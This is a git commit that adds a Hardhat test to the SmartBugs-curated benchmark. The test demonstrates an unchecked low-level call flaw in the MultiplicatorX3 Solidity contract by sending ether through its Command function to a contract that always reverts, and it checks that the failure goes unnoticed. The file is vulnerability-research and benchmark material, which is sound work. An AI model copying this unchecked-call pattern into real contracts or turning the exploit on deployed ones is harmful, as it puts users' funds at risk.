517855731d4ab8aa769b9c44a8613ce7bf47e451
Monica Jin <monicachenjin@gmail.com>
2024-09-10 15:02:07 +0200

    add MultiplicatorX3 exploit

---
+++ smartbugs-curated/0.4.x/test/unchecked_low_level_calls/0x5aa88d2901c68fda244f1d0584400368d2c8e739_test.js
@@ -0,0 +1,36 @@
+const { loadFixture } = require('@nomicfoundation/hardhat-network-helpers');
+const { expect } = require('chai');
+
+describe("attack unchecked_low_level_calls/0x5aa88d2901c68fda244f1d0584400368d2c8e739.sol", function () {
+
+  let onwer;
+
+  async function deployContracts() {
+    [owner] = await ethers.getSigners();
+    const MultiplicatorX3 = await ethers.getContractFactory("contracts/dataset/unchecked_low_level_calls/0x5aa88d2901c68fda244f1d0584400368d2c8e739.sol:MultiplicatorX3");
+    const contract = await MultiplicatorX3.connect(owner).deploy();
+
+    const RevertContract = await ethers.getContractFactory("contracts/unchecked_low_level_calls/revert_contract.sol:RevertContract");
+    const revertContract = await RevertContract.deploy();
+
+    return {contract, revertContract}
+  };
+
+  it("exploit unchecked low level call vulnerability", async function () {
+    const {contract, revertContract} = await loadFixture(deployContracts);
+    const amount = ethers.parseEther("1");
+    await expect(
+      owner.sendTransaction({
+        to: revertContract.target,
+        value: amount,
+      })
+    ).to.be.revertedWith("I always revert!");
+
+    await expect(contract.connect(owner).Command(revertContract.target, "0x", {value: amount})).to.not.be.reverted;
+
+    expect(await ethers.provider.getBalance(contract.target)).to.be.equal(amount);
+
+    expect(await ethers.provider.getBalance(revertContract.target)).to.be.equal(0);
+
+  });
+});
